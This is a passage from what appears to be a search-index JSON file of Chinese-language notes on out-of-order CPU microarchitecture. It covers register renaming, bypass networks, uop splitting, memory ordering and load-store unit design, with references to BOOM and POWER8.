\u200b\u5728\u200b\u5206\u53d1\u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u5c31\u200b\u4f1a\u200b\u4ece\u200b\u5bc4\u5b58\u5668\u200b\u5806\u200b\u8bfb\u53d6\u6570\u636e\u200b\uff0c\u200b\u4fdd\u5b58\u200b\u5230\u200b\u4fdd\u7559\u200b\u7ad9\u200b\u4e2d\u200b\uff1b\u200b\u800c\u200b Explicit Renaming \u200b\u662f\u200b\u6307\u4ee4\u200b\u4ece\u200b Issue Queue \u200b\u5230\u200b\u6267\u884c\u200b\u5355\u5143\u200b\u65f6\u5019\u200b\u4ece\u200b\u5bc4\u5b58\u5668\u200b\u5806\u200b\u8bfb\u53d6\u6570\u636e\u200b</li> <li>Implicit Renaming \u200b\u7684\u200b\u5bc4\u5b58\u5668\u200b\u5806\u200b\u8bfb\u53d6\u200b\u53e3\u8f83\u200b\u5c11\u200b\uff0c\u200b\u53ea\u200b\u9700\u8981\u200b\u8003\u8651\u200b\u53d1\u5c04\u200b\u6570\u200b\u4e58\u4ee5\u200b\u64cd\u4f5c\u6570\u200b\u4e2a\u6570\u200b\uff0c\u200b\u4f46\u200b\u6240\u6709\u200b\u7c7b\u578b\u200b\u7684\u200b\u5bc4\u5b58\u5668\u200b\u5806\u200b\uff08\u200b\u6574\u6570\u200b\u3001\u200b\u6d6e\u70b9\u200b\uff09\u200b\u90fd\u200b\u9700\u8981\u200b\u8bfb\u53d6\u200b\uff1bExplicit Renaming \u200b\u7684\u200b\u5bc4\u5b58\u5668\u200b\u5806\u200b\u8bfb\u53d6\u200b\u53e3\u200b\u66f4\u200b\u591a\u200b\uff0c\u200b\u5bf9\u4e8e\u200b\u6bcf\u4e2a\u200b Issue Queue\uff0c\u200b\u90fd\u200b\u9700\u8981\u200b\u64cd\u4f5c\u6570\u200b\u4e2a\u6570\u200b\u4e2a\u200b\u8bfb\u53d6\u200b\u53e3\u200b\uff0c\u200b\u4f46\u200b\u597d\u5904\u200b\u662f\u200b\u53ef\u4ee5\u200b\u5c4f\u853d\u6389\u200b\u4e0d\u200b\u9700\u8981\u200b\u8bbf\u95ee\u200b\u7684\u200b\u8bfb\u53d6\u200b\u53e3\u200b\uff0c\u200b\u6bd4\u5982\u200b\u6d6e\u70b9\u200b FMA \u200b\u6d41\u6c34\u200b\u4e0d\u200b\u9700\u8981\u200b\u8bfb\u53d6\u200b\u6574\u6570\u200b\u5bc4\u5b58\u5668\u200b\u5806\u200b\u3002\u200b\u5199\u200b\u548c\u200b\u8bfb\u200b\u662f\u200b\u7c7b\u4f3c\u200b\u7684\u200b\uff1aImplicit Renaming \u200b\u4e2d\u200b\uff0c\u200b\u5bc4\u5b58\u5668\u200b\u5806\u200b\u7684\u200b\u5199\u5165\u200b\u662f\u4ece\u200b ROB \u200b\u4e0a\u200b\u63d0\u4ea4\u200b\uff1b\u200b\u800c\u200b Explicit Renaming \u200b\u5219\u200b\u662f\u200b\u6267\u884c\u200b\u5355\u5143\u200b\u8ba1\u7b97\u200b\u5b8c\u540e\u200b\u5199\u5165\u200b\u5bc4\u5b58\u5668\u200b\u5806\u200b\u3002</li> </ol>"},{"location":"hardware/ooo_cpu.html#_1","title":"\u5e38\u89c1\u200b\u4f18\u5316\u200b\u624b\u6bb5","text":"<p>\u200b\u5728\u200b\u7b2c\u4e00\u200b\u548c\u200b\u7b2c\u4e8c\u79cd\u200b\u8bbe\u8ba1\u200b\u4e2d\u200b\uff0c\u200b\u5f53\u200b\u4e00\u6761\u200b\u6307\u4ee4\u200b\u8ba1\u7b97\u200b\u5b8c\u6210\u200b\u65f6\u200b\uff0c\u200b\u7ed3\u679c\u200b\u4f1a\u200b\u76f4\u63a5\u200b\u901a\u8fc7\u200b CDB \u200b\u8f6c\u53d1\u200b\u5230\u200b\u5176\u4ed6\u200b\u6307\u4ee4\u200b\u7684\u200b\u8f93\u5165\u200b\uff0c\u200b\u8fd9\u6837\u200b\u53ef\u4ee5\u200b\u63d0\u9ad8\u200b\u8fd0\u884c\u200b\u6548\u7387\u200b\u3002\u200b\u5728\u200b\u7b2c\u4e09\u79cd\u200b\u8bbe\u8ba1\u200b\u4e2d\u200b\uff0c\u200b\u4e3a\u4e86\u200b\u63d0\u9ad8\u6548\u7387\u200b\uff0c\u200b\u4e5f\u200b\u53ef\u4ee5\u200b\u505a\u200b\u7c7b\u4f3c\u200b\u7684\u200b\u4e8b\u60c5\u200b\uff0c\u200b\u4f46\u200b\u56e0\u4e3a\u200b\u4e2d\u95f4\u200b\u591a\u200b\u4e86\u200b\u4e00\u7ea7\u200b\u5bc4\u5b58\u5668\u200b\u5806\u200b\u8bfb\u53d6\u200b\u7684\u200b\u6d41\u6c34\u7ebf\u200b\u7ea7\u200b\uff0c\u200b\u5904\u7406\u200b\u4f1a\u200b\u66f4\u52a0\u200b\u590d\u6742\u200b\u4e00\u70b9\u200b\u3002\u200b\u6bd4\u5982\u200b\uff0c\u200b\u6709\u200b\u4e00\u6761\u200b ALU \u200b\u6307\u4ee4\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u786e\u5b9a\u200b\u5b83\u200b\u5728\u200b\u4e00\u4e2a\u200b\u5468\u671f\u200b\u540e\u200b\u4e00\u5b9a\u200b\u4f1a\u200b\u5f97\u5230\u200b\u8ba1\u7b97\u7ed3\u679c\u200b\uff0c\u200b\u90a3\u4e48\u200b\u6211\u200b\u5c31\u200b\u53ef\u4ee5\u200b\u63d0\u524d\u200b\u628a\u200b\u4f9d\u8d56\u200b\u8fd9\u200b\u6761\u200b\u6307\u4ee4\u200b\u7684\u200b\u5176\u4ed6\u200b\u6307\u4ee4\u200b Dispatch \u200b\u51fa\u53bb\u200b\uff0c\u200b\u7136\u540e\u200b\u5728\u200b ALU \u200b\u4e4b\u95f4\u200b\u8fde\u63a5\u200b\u4e00\u4e2a\u200b bypass \u200b\u7f51\u7edc\u200b\uff0c\u200b\u8fd9\u6837\u200b\u5c31\u200b\u53ef\u4ee5\u200b\u51cf\u5c11\u200b\u4e00\u4e9b\u200b\u5468\u671f\u200b\u3002</p> <p>\u200b\u6b64\u5916\u200b\uff0c\u200b\u4e3a\u4e86\u200b\u63d0\u9ad8\u200b\u541e\u5410\u200b\u7387\u200b\uff0c\u200b\u4e00\u822c\u200b\u8ba1\u7b97\u200b\u5355\u5143\u200b\u90fd\u200b\u88ab\u200b\u8bbe\u8ba1\u200b\u4e3a\u200b\u6bcf\u4e2a\u200b\u5468\u671f\u200b\u53ef\u4ee5\u200b\u63a5\u53d7\u200b\u4e00\u6761\u200b\u6307\u4ee4\u200b\uff0c\u200b\u5728\u200b\u5185\u90e8\u200b\u5b9e\u73b0\u200b\u6d41\u6c34\u7ebf\u200b\u6267\u884c\u200b\uff0c\u200b\u6bcf\u4e2a\u200b\u5468\u671f\u200b\u5b8c\u6210\u200b\u4e00\u6761\u200b\u6307\u4ee4\u200b\u7684\u200b\u8ba1\u7b97\u200b\u3002\u200b\u5f53\u7136\u200b\u4e86\u200b\uff0c\u200b\u5f88\u591a\u200b\u65f6\u5019\u200b\u7531\u4e8e\u200b\u6570\u636e\u200b\u4f9d\u8d56\u200b\u95ee\u9898\u200b\uff0c\u200b\u53ef\u80fd\u200b\u5e76\u200b\u4e0d\u80fd\u200b\u8fbe\u5230\u200b\u6bcf\u4e2a\u200b\u5468\u671f\u200b\u6bcf\u4e2a\u200b\u8ba1\u7b97\u200b\u5355\u5143\u200b\u90fd\u200b\u6ee1\u8f7d\u200b\u7684\u200b\u60c5\u51b5\u200b\u3002</p> <p>\u200b\u6709\u4e9b\u200b\u65f6\u5019\u200b\uff0c\u200b\u4e00\u4e9b\u200b\u6307\u4ee4\u200b\u4e0d\u200b\u65b9\u4fbf\u200b\u540e\u200b\u7aef\u200b\u5b9e\u73b0\u200b\uff0c\u200b\u5c31\u4f1a\u52a0\u200b\u4e00\u5c42\u200b\u8f6c\u6362\u200b\uff0c\u200b\u4ece\u200b\u6307\u4ee4\u200b\u8f6c\u6362\u200b\u4e3a\u200b uop\uff0c\u200b\u518d\u200b\u7531\u200b\u540e\u200b\u7aef\u200b\u6267\u884c\u200b\u3002\u200b\u8fd9\u200b\u5728\u200b x86 \u200b\u5904\u7406\u5668\u200b\u4e0a\u200b\u5f88\u200b\u666e\u904d\u200b\uff0c\u200b\u56e0\u4e3a\u200b\u6307\u4ee4\u96c6\u200b\u592a\u200b\u590d\u6742\u200b\u4e86\u200b\u3002\u200b\u50cf\u200b AArch64 \u200b\u6307\u4ee4\u96c6\u200b\uff0c\u200b\u5b83\u200b\u5728\u200b Load/Store \u200b\u7684\u200b\u65f6\u5019\u200b\u53ef\u4ee5\u200b\u5bf9\u200b\u5730\u5740\u200b\u8fdb\u884c\u200b\u8ba1\u7b97\u200b\uff0c\u200b\u8fd9\u79cd\u200b\u65f6\u5019\u200b\u4e5f\u200b\u662f\u200b\u62c6\u200b\u5206\u4e3a\u200b\u4e24\u6761\u200b uop \u200b\u6765\u200b\u6267\u884c\u200b\u3002\u200b\u4e00\u4e9b\u200b\u5b9e\u7528\u200b\u7684\u200b\u6307\u4ee4\u200b\u9700\u8981\u200b\u4e09\u4e2a\u200b\u64cd\u4f5c\u6570\u200b\uff0c\u200b\u6bd4\u5982\u200b <code>D = A ? B : C</code>\uff0c\u200b\u5728\u200b Alpha 21264 \u200b\u4e2d\u200b\uff0c\u200b\u8fd9\u200b\u6761\u200b\u6307\u4ee4\u200b\u4f1a\u200b\u8f6c\u6362\u200b\u4e3a\u200b\u4e24\u6761\u200b uop\uff0c\u200b\u8fd9\u200b\u4e24\u6761\u200b uop \u200b\u7684\u200b\u64cd\u4f5c\u6570\u200b\u5c31\u200b\u53ea\u6709\u200b\u4e24\u4e2a\u200b\uff0c\u200b\u4fbf\u4e8e\u200b\u540e\u200b\u7aef\u200b\u5b9e\u73b0\u200b\uff0c\u200b\u5426\u5219\u200b\u5728\u200b\u5404\u4e2a\u200b\u5730\u65b9\u200b\u90fd\u200b\u5141\u8bb8\u200b\u4e09\u4e2a\u200b\u64cd\u4f5c\u6570\u200b\u4f1a\u200b\u5bfc\u81f4\u200b\u4e00\u5b9a\u200b\u7684\u200b\u6d6a\u8d39\u200b\u3002</p>"},{"location":"hardware/ooo_cpu.html#_2","title":"\u5185\u5b58\u200b\u8bbf\u95ee","text":"<p>\u200b\u5185\u5b58\u200b\u8bbf\u95ee\u200b\u662f\u200b\u4e00\u4e2a\u200b\u6bd4\u8f83\u590d\u6742\u200b\u7684\u200b\u64cd\u4f5c\u200b\uff0c\u200b\u5b83\u200b\u6d89\u53ca\u200b\u5230\u200b\u7f13\u5b58\u200b\u3001\u200b\u9875\u8868\u200b\u3001\u200b\u5185\u5b58\u200b\u5e8f\u200b\u7b49\u200b\u95ee\u9898\u200b\u3002\u200b\u5728\u200b\u4e71\u5e8f\u6267\u884c\u200b\u4e2d\u200b\uff0c\u200b\u8981\u200b\u5c3d\u91cf\u200b\u4f18\u5316\u200b\u5185\u5b58\u200b\u8bbf\u95ee\u200b\u5bf9\u200b\u5176\u4ed6\u200b\u6307\u4ee4\u200b\u7684\u200b\u5ef6\u8fdf\u200b\u7684\u200b\u5f71\u54cd\u200b\uff0c\u200b\u540c\u65f6\u200b\u4e5f\u200b\u8981\u200b\u4fdd\u8bc1\u200b\u6b63\u786e\u6027\u200b\u3002\u200b\u8fd9\u91cc\u200b\u53c2\u8003\u200b\u7684\u200b\u662f\u200b BOOM \u200b\u7684\u200b LSU \u200b\u8bbe\u8ba1\u200b\u3002</p> <p>\u200b\u9996\u5148\u200b\u662f\u200b\u6b63\u786e\u6027\u200b\u3002\u200b\u4e00\u822c\u6765\u8bf4\u200b\u53ef\u4ee5\u200b\u8ba4\u4e3a\u200b\uff0cLoad \u200b\u662f\u200b\u6ca1\u6709\u200b\u526f\u4f5c\u7528\u200b\u7684\u200b\uff08\u200b\u5b9e\u9645\u4e0a\u200b\uff0cLoad \u200b\u4f1a\u200b\u5bfc\u81f4\u200b Cache \u200b\u52a0\u8f7d\u200b\u6570\u636e\u200b\uff0c\u200b\u8fd9\u200b\u4e5f\u200b\u5f15\u53d1\u200b\u4e86\u200b\u4ee5\u200b Meltdown \u200b\u4e3a\u9996\u200b\u7684\u200b\u4e00\u7cfb\u5217\u200b\u6f0f\u6d1e\u200b\uff09\uff0c\u200b\u56e0\u6b64\u200b\u53ef\u4ee5\u200b\u5f88\u200b\u6fc0\u8fdb\u200b\u5730\u200b\u9884\u6d4b\u200b\u6267\u884c\u200b Load\u3002\u200b\u4f46\u662f\u200b\uff0cStore \u200b\u662f\u200b\u6709\u200b\u526f\u4f5c\u7528\u200b\u7684\u200b\uff0c\u200b\u5199\u51fa\u53bb\u200b\u7684\u200b\u6570\u636e\u200b\u5c31\u200b\u6ca1\u6cd5\u200b\u8fd8\u539f\u200b\u4e86\u200b\u3002\u200b\u56e0\u6b64\u200b\uff0cStore \u200b\u6307\u4ee4\u200b\u53ea\u6709\u200b\u5728\u200b ROB Head \u200b\u88ab\u200b Commit \u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u624d\u200b\u4f1a\u200b\u5199\u5165\u200b\u5230\u200b Cache \u200b\u4e2d\u200b\u3002</p> <p>\u200b\u5176\u6b21\u200b\u662f\u200b\u6027\u80fd\u200b\uff0c\u200b\u6211\u4eec\u200b\u5e0c\u671b\u200b Load \u200b\u6307\u4ee4\u200b\u53ef\u4ee5\u200b\u5c3d\u5feb\u200b\u5730\u200b\u5b8c\u6210\u200b\uff0c\u200b\u8fd9\u6837\u200b\u53ef\u4ee5\u200b\u4f7f\u5f97\u200b\u540e\u7eed\u200b\u7684\u200b\u8ba1\u7b97\u200b\u6307\u4ee4\u200b\u53ef\u4ee5\u200b\u5c3d\u5feb\u200b\u5730\u200b\u5f00\u59cb\u200b\u8fdb\u884c\u200b\u3002\u200b\u5f53\u200b Load \u200b\u6307\u4ee4\u200b\u7684\u200b\u5730\u5740\u200b\u5df2\u7ecf\u200b\u8ba1\u7b97\u200b\u597d\u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u5c31\u200b\u53ef\u4ee5\u200b\u53bb\u53d6\u200b\u6570\u636e\u200b\uff0c\u200b\u8fd9\u65f6\u5019\u200b\uff0c\u200b\u9996\u5148\u200b\u8981\u200b\u53bb\u200b Store Queue \u200b\u91cc\u9762\u200b\u627e\u200b\uff0c\u200b\u5982\u679c\u200b\u6709\u200b Store \u200b\u6307\u4ee4\u200b\u8981\u200b\u5199\u5165\u200b\u7684\u200b\u5730\u5740\u200b\u7b49\u4e8e\u200b Load \u200b\u7684\u200b\u5730\u5740\u200b\uff0c\u200b\u8bf4\u660e\u200b\u540e\u9762\u200b\u7684\u200b Load \u200b\u4f9d\u8d56\u4e8e\u200b\u524d\u9762\u200b\u7684\u200b Store\uff0c\u200b\u5982\u679c\u200b Store \u200b\u7684\u200b\u6570\u636e\u200b\u5df2\u7ecf\u200b\u51c6\u5907\u200b\u597d\u200b\u4e86\u200b\uff0c\u200b\u5c31\u200b\u53ef\u4ee5\u200b\u76f4\u63a5\u200b\u628a\u200b\u6570\u636e\u200b\u8f6c\u53d1\u200b\u8fc7\u6765\u200b\uff0c\u200b\u5c31\u200b\u4e0d\u200b\u9700\u8981\u200b\u4ece\u200b Cache \u200b\u4e2d\u200b\u83b7\u53d6\u200b\uff0c\u200b\u5982\u679c\u200b\u6570\u636e\u200b\u8fd8\u200b\u6ca1\u200b\u51c6\u5907\u200b\u597d\u200b\uff0c\u200b\u5c31\u200b\u9700\u8981\u200b\u7b49\u5f85\u200b\u8fd9\u200b\u4e00\u6761\u200b Store \u200b\u5b8c\u6210\u200b\uff1b\u200b\u5982\u679c\u200b\u6ca1\u6709\u200b\u627e\u5230\u200b\u5339\u914d\u200b\u7684\u200b Store \u200b\u6307\u4ee4\u200b\uff0c\u200b\u518d\u200b\u4ece\u200b\u5185\u5b58\u200b\u4e2d\u53d6\u200b\u3002\u200b\u4e0d\u8fc7\u200b\uff0c\u200b\u6709\u200b\u4e00\u79cd\u200b\u60c5\u51b5\u200b\u5c31\u662f\u200b\uff0c\u200b\u5f53\u200b Store \u200b\u6307\u4ee4\u200b\u7684\u200b\u5730\u5740\u200b\u8fdf\u8fdf\u200b\u6ca1\u6709\u200b\u8ba1\u7b97\u51fa\u6765\u200b\uff0c\u200b\u800c\u200b\u540e\u9762\u200b\u7684\u200b Load \u200b\u5df2\u7ecf\u200b\u63d0\u524d\u200b\u4ece\u200b Cache \u200b\u4e2d\u200b\u83b7\u53d6\u6570\u636e\u200b\u4e86\u200b\uff0c\u200b\u8fd9\u65f6\u5019\u200b\u5c31\u200b\u4f1a\u200b\u51fa\u73b0\u200b\u9519\u8bef\u200b\uff0c\u200b\u6240\u4ee5\u200b\u5f53\u200b Store \u200b\u8ba1\u7b97\u200b\u51fa\u200b\u5730\u5740\u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u9700\u8981\u200b\u68c0\u67e5\u200b\u540e\u9762\u200b\u7684\u200b Load \u200b\u6307\u4ee4\u200b\u662f\u5426\u200b\u51fa\u73b0\u200b\u5730\u5740\u200b\u91cd\u5408\u200b\uff0c\u200b\u5982\u679c\u200b\u51fa\u73b0\u200b\u4e86\u200b\uff0c\u200b\u5c31\u8981\u200b\u628a\u200b\u8fd9\u6761\u200b Load \u200b\u4ee5\u53ca\u200b\u4f9d\u8d56\u200b\u8fd9\u200b\u6761\u200b Load \u200b\u6307\u4ee4\u200b\u7684\u200b\u5176\u4f59\u200b\u6307\u4ee4\u200b\u91cd\u65b0\u200b\u6267\u884c\u200b\u3002POWER8 \u200b\u5904\u7406\u5668\u200b\u5fae\u200b\u67b6\u6784\u200b\u8bba\u6587\u200b\u4e2d\u200b\u5bf9\u6b64\u200b\u4e5f\u200b\u6709\u200b\u7c7b\u4f3c\u200b\u7684\u200b\u8868\u8ff0\u200b\uff1a</p> <pre><code>The POWER8 IFU also implements mechanisms to mitigate performance\ndegradation associated with pipeline hazards. A Store-Hit-Load (SHL) is\nan out-of-order pipeline hazard condition, where an older store executes\nafter a younger overlapping load, thus signaling that the load received\nstale data. The POWER8 IFU has logic to detect when this condition\nexists and provide control to avoid the hazard by flushing the load\ninstruction which received stale data (and any following instructions).\nWhen a load is flushed due to detection of a SHL, the fetch address of\nthe load is saved and the load is marked on subsequent fetches allowing\nthe downstream logic to prevent the hazard. When a marked load\ninstruction is observed, the downstream logic introduces an explicit\nregister dependency for the load to ensure that it is issued after the\nstore operation.\n</code></pre>"},{"location":"hardware/ooo_cpu.html#load-store-unit","title":"Load Store Unit","text":"<p>LSU \u200b\u662f\u200b\u5f88\u200b\u91cd\u8981\u200b\u7684\u200b\u4e00\u4e2a\u200b\u6267\u884c\u200b\u5355\u5143\u200b\uff0c\u200b\u8d1f\u8d23\u200b Load/Store/Atomic \u200b\u7b49\u200b\u6307\u4ee4\u200b\u7684\u200b\u5b9e\u73b0\u200b\u3002\u200b\u6700\u200b\u7b80\u5355\u200b\u7684\u200b\u5b9e\u73b0\u200b\u65b9\u6cd5\u200b\u662f\u200b\u6309\u200b\u987a\u5e8f\u200b\u6267\u884c\u200b\uff0c\u200b\u4f46\u200b\u7531\u4e8e\u200b pipeline \u200b\u4f1a\u200b\u88ab\u200b\u6e05\u7a7a\u200b\uff0cStore/Atomic/Uncached Load \u200b\u8fd9\u7c7b\u200b\u6709\u200b\u526f\u4f5c\u7528\u200b\uff08\u200b\u5f53\u7136\u200b\u4e86\u200b\uff0c\u200b\u5982\u679c\u200b\u8003\u8651\u200b Meltdown \u200b\u7c7b\u200b\u653b\u51fb\u200b\u7684\u8bdd\u200b\uff0cCached Load \u200b\u4e5f\u200b\u6709\u200b\u526f\u4f5c\u7528\u200b\uff0c\u200b\u8fd9\u91cc\u200b\u5c31\u200b\u5ffd\u7565\u200b\u4e86\u200b\uff09\uff0c\u200b\u9700\u8981\u200b\u7b49\u5230\u200b commit \u200b\u7684\u200b\u65f6\u5019\u200b\u518d\u200b\u6267\u884c\u200b\u3002\u200b\u8fd9\u6837\u200b LSU \u200b\u5f88\u200b\u5bb9\u6613\u200b\u6210\u4e3a\u200b\u74f6\u9888\u200b\uff0c\u200b\u7279\u522b\u200b\u662f\u200b\u5728\u200b\u8bbf\u5b58\u200b\u6307\u4ee4\u200b\u6bd4\u8f83\u200b\u591a\u200b\u7684\u200b\u65f6\u5019\u200b\u3002</p> <p>\u200b\u4e3a\u4e86\u200b\u89e3\u51b3\u200b\u8fd9\u4e2a\u200b\u95ee\u9898\u200b\uff0c\u200b\u5f88\u200b\u91cd\u8981\u200b\u7684\u200b\u662f\u200b\u8ba9\u200b\u8bfb\u5199\u200b\u4e5f\u200b\u4e71\u5e8f\u200b\u8d77\u6765\u200b\uff0c\u200b\u5177\u4f53\u200b\u600e\u4e48\u200b\u4e71\u5e8f\u200b\uff0c\u200b\u53d7\u5230\u200b\u5b9e\u73b0\u200b\u7684\u200b\u5f71\u54cd\u200b\u548c\u200b Memory Order/Program Order \u200b\u7684\u200b\u8981\u6c42\u200b\u3002\u200b\u4ece\u200b\u6027\u80fd\u200b\u7684\u200b\u89d2\u5ea6\u200b\u4e0a\u200b\u6765\u770b\u200b\uff0c\u200b\u6211\u4eec\u200b\u80af\u5b9a\u200b\u5e0c\u671b\u200b Load \u200b\u53ef\u4ee5\u200b\u5c3d\u5feb\u200b\u6267\u884c\u200b\uff0c\u200b\u56e0\u4e3a\u200b\u53ef\u80fd\u200b\u6709\u200b\u5f88\u591a\u200b\u6307\u4ee4\u200b\u5728\u200b\u7b49\u5f85\u200b Load \u200b\u7684\u200b\u7ed3\u679c\u200b\u3002\u200b\u90a3\u4e48\u200b\uff0c\u200b\u9700\u8981\u200b\u63d0\u524d\u200b\u6267\u884c\u200b Load\uff0c\u200b\u4f46\u662f\u200b\u600e\u4e48\u200b\u4fdd\u8bc1\u200b\u6b63\u786e\u6027\u200b\u5462\u200b\uff1f\u200b\u5728\u200b Load \u200b\u66f4\u200b\u65e9\u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u53ef\u80fd\u200b\u8fd8\u6709\u200b\u82e5\u5e72\u4e2a\u200b Store \u200b\u6307\u4ee4\u200b\u5c1a\u672a\u200b\u6267\u884c\u200b\uff0c\u200b\u4e00\u4e2a\u200b\u601d\u8def\u200b\u662f\u200b\u7b49\u5f85\u200b\u6240\u6709\u200b\u7684\u200b Store \u200b\u6267\u884c\u200b\u5b8c\u6bd5\u200b\uff0c\u200b\u4f46\u662f\u200b\u8fd9\u6837\u200b\u6027\u80fd\u200b\u4e0d\u597d\u200b\uff1b\u200b\u53e6\u200b\u4e00\u4e2a\u200b\u601d\u8def\u200b\u662f\u200b\u7528\u200b\u5730\u5740\u200b\u6765\u200b\u641c\u7d22\u200b Store \u200b\u6307\u4ee4\u200b\uff0c\u200b\u770b\u770b\u200b\u662f\u5426\u200b\u51fa\u73b0\u200b\u5bf9\u200b\u540c\u4e00\u4e2a\u200b\u5730\u5740\u200b\u7684\u200b Store \u200b\u548c\u200b Load\uff0c\u200b\u5982\u679c\u200b\u6709\u200b\uff0c\u200b\u76f4\u63a5\u200b\u8f6c\u53d1\u200b\u6570\u636e\u200b\uff0c\u200b\u5c31\u200b\u4e0d\u200b\u9700\u8981\u200b\u4ece\u200b Cache \u200b\u83b7\u53d6\u200b\u4e86\u200b\uff0c\u200b\u4e0d\u8fc7\u200b\u8fd9\u79cd\u200b\u65b9\u6cd5\u200b\u76f8\u5f53\u4e8e\u200b\u505a\u200b\u4e86\u200b\u4e00\u4e2a\u200b\u5168\u200b\u76f8\u8fde\u200b\u7684\u200b Buffer\uff0c\u200b\u9762\u79ef\u200b\u5927\u200b\uff0c\u200b\u5ef6\u8fdf\u200b\u9ad8\u200b\uff0c\u200b\u4e0d\u597d\u200b\u6269\u5c55\u200b\u7b49\u200b\u95ee\u9898\u200b\u63a5\u8e35\u800c\u81f3\u200b\u3002</p> <p>\u200b\u4e3a\u4e86\u200b\u89e3\u51b3\u200b Store Queue \u200b\u9700\u8981\u200b\u76f8\u8fde\u200b\u641c\u7d22\u200b\u7684\u200b\u95ee\u9898\u200b\uff0cA high-bandwidth load-store unit for single-and multi-threaded processors \u200b\u7684\u200b\u89e3\u51b3\u200b\u601d\u8def\u200b\u662f\u200b\uff0c\u200b\u628a\u200b Store \u200b\u6307\u4ee4\u200b\u5206\u4e3a\u200b\u4e24\u7c7b\u200b\uff0c\u200b\u4e00\u7c7b\u200b\u662f\u200b\u9700\u8981\u200b\u8f6c\u53d1\u200b\u7684\u200b\uff0c\u200b\u4e00\u7c7b\u200b\u662f\u200b\u4e0d\u200b\u9700\u8981\u200b\u7684\u200b\uff0c\u200b\u90a3\u4e48\u200b\u53ef\u4ee5\u200b\u8bbe\u8ba1\u200b\u4e00\u4e2a\u200b\u5c0f\u200b\u7684\u200b\u76f8\u8fde\u200b\u5b58\u50a8\u5668\u200b\uff0c\u200b\u53ea\u200b\u4fdd\u5b58\u200b\u8fd9\u4e9b\u200b\u9700\u8981\u200b\u8f6c\u53d1\u200b\u7684\u200b Store \u200b\u6307\u4ee4\u200b\uff1b\u200b\u540c\u65f6\u200b\u8fd8\u6709\u200b\u4e00\u4e2a\u200b\u6bd4\u8f83\u200b\u5927\u200b\u7684\u200b\uff0c\u200b\u4fdd\u5b58\u200b\u6240\u6709\u200b Store \u200b\u6307\u4ee4\u200b\u7684\u200b\u961f\u5217\u200b\uff0c\u200b\u56e0\u4e3a\u200b\u4e0d\u200b\u9700\u8981\u200b\u76f8\u8fde\u200b\u641c\u7d22\u200b\uff0c\u200b\u6240\u4ee5\u200b\u53ef\u4ee5\u200b\u505a\u200b\u7684\u200b\u6bd4\u8f83\u200b\u5927\u200b\u3002</p> <p>\u200b\u4ed4\u7ec6\u200b\u60f3\u60f3\u200b\uff0c\u200b\u8fd9\u91cc\u200b\u8fd8\u6709\u200b\u4e00\u4e2a\u200b\u95ee\u9898\u200b\uff1aLoad \u200b\u5728\u200b\u6267\u884c\u200b\u524d\u200b\uff0c\u200b\u66f4\u200b\u65e9\u200b\u7684\u200b Store \u200b\u7684\u200b\u5730\u5740\u200b\u53ef\u80fd\u200b\u8fd8\u200b\u6ca1\u6709\u200b\u5c31\u7eea\u200b\uff0c\u200b\u8fd9\u65f6\u5019\u200b\u53bb\u200b\u641c\u7d22\u200b Store Queue \u200b\u5f97\u5230\u200b\u7684\u200b\u7ed3\u679c\u200b\u53ef\u80fd\u200b\u662f\u200b\u9519\u200b\u7684\u200b\uff0c\u200b\u8fd9\u65f6\u5019\u200b\u8981\u4e48\u200b\u7b49\u5f85\u200b\u6240\u6709\u200b\u7684\u200b Store \u200b\u5730\u5740\u200b\u90fd\u200b\u5c31\u7eea\u200b\uff0c\u200b\u8981\u4e48\u200b\u5c31\u200b\u5148\u200b\u6267\u884c\u200b\uff0c\u200b\u518d\u7528\u200b\u4e00\u4e9b\u200b\u673a\u5236\u200b\u6765\u200b\u4fee\u590d\u200b\u8fd9\u4e2a\u200b\u95ee\u9898\u200b\uff0c\u200b\u663e\u7136\u200b\u540e\u8005\u200b IPC \u200b\u8981\u200b\u66f4\u597d\u200b\u3002</p> <p>\u200b\u4fee\u590d\u200b Load Store \u200b\u6307\u4ee4\u200b\u76f8\u5173\u6027\u200b\u95ee\u9898\u200b\uff0c\u200b\u4e00\u4e2a\u200b\u65b9\u6cd5\u200b\u662f\u200b\u5f53\u200b\u4e00\u4e2a\u200b Store \u200b\u63d0\u4ea4\u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u68c0\u67e5\u200b\u662f\u5426\u200b\u6709\u200b\u5730\u5740\u200b\u51b2\u7a81\u200b\u7684\u200b Load \u200b\u6307\u4ee4\u200b\uff08\u200b\u90a3\u4e48\u200b Load Queue \u200b\u4e5f\u200b\u8981\u200b\u505a\u6210\u200b\u76f8\u8fde\u200b\u641c\u7d22\u200b\u7684\u200b\uff09\uff0c\u200b\u662f\u5426\u200b\u8f6c\u53d1\u200b\u4e86\u200b\u9519\u8bef\u200b\u7684\u200b Store \u200b\u6570\u636e\u200b\uff0c\u200b\u8fd9\u200b\u4e5f\u200b\u662f\u200b Boom LSU \u200b\u91c7\u7528\u200b\u7684\u200b\u65b9\u6cd5\u200b\u3002\u200b\u53e6\u200b\u4e00\u4e2a\u200b\u529e\u6cd5\u200b\u662f\u200b Commit \u200b\u7684\u200b\u65f6\u5019\u200b\uff08\u200b\u6216\u8005\u200b\u6309\u200b\u987a\u5e8f\u200b\uff09\u200b\u91cd\u65b0\u200b\u6267\u884c\u200b Load \u200b\u6307\u4ee4\u200b\uff0c\u200b\u5982\u679c\u200b Load \u200b\u7ed3\u679c\u200b\u548c\u200b\u4e4b\u524d\u200b\u4e0d\u540c\u200b\uff0c\u200b\u8981\u200b\u628a\u200b\u540e\u9762\u200b\u4f9d\u8d56\u200b\u7684\u200b\u5237\u65b0\u200b\u6389\u200b\uff0c\u200b\u8fd9\u79cd\u200b\u65b9\u5f0f\u200b\u7684\u200b\u7f3a\u70b9\u200b\u662f\u200b\u6bcf\u6761\u200b Load \u200b\u6307\u4ee4\u200b\u90fd\u200b\u8981\u200b\u81f3\u5c11\u200b\u8bbf\u95ee\u200b\u4e24\u6b21\u200b Cache\u3002Store Vulnerability Window (SVW): Re-Execution Filtering for Enhanced Load Optimization \u200b\u5c5e\u4e8e\u200b\u91cd\u65b0\u200b\u6267\u884c\u200b Load \u200b\u6307\u4ee4\u200b\u7684\u200b\u65b9\u6cd5\u200b\uff0c\u200b\u901a\u8fc7\u200b Bloom filter 